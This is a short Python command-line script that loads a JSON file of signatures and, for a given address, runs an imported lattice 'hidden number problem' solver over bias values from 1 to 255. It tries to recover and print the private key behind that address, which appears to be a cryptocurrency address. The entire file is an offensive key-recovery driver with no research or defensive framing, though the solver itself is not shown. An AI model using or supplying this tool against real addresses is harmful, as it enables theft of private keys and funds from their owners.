import json
import sys
from lattice_nonce_analyzer import solve_hnp

def offline_lattice(filename, address):
    with open(filename, "r") as f:
        sigs = json.load(f)
    
    print(f"Loaded {len(sigs)} sigs from {filename}")
    
    for b in range(1, 256):
        if b % 32 == 0: print(f"Trying bias_bits={b}...")
        key = solve_hnp(sigs, b, address=address)
        if key:
            print(f"!!! SUCCESS at bias_bits={b} !!!")
            print(f"Private Key: {hex(key)}")
            return key
    print("No key found.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 offline_lattice_analyzer.py <json_file> <address>")
    else:
        offline_lattice(sys.argv[1], sys.argv[2])
